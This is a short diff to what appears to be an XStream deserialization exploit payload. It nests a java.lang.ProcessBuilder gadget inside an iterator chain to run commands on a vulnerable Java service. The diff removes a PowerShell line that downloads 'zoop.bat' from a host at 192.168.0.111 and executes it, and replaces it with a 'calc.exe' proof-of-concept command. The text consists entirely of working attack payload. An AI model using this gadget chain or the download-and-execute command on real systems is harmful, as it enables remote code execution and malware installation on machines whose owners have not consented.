@@ -14,7 +14,9 @@
                                         <iter class="java.util.Collections$EmptyIterator"/>
                                         <next class="java.lang.ProcessBuilder">
                                             <command>
-                                                <string>powershell</string><string>(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.111/zoop.bat','zoop.bat');</string><string>Start-Process 'zoop.bat'</string>
+                                                <string>cmd.exe</string>
+                                                <string>/c</string>
+                                                <string>calc.exe</string>
                                             </command>
                                             <redirectErrorStream>false</redirectErrorStream>
                                         </next>
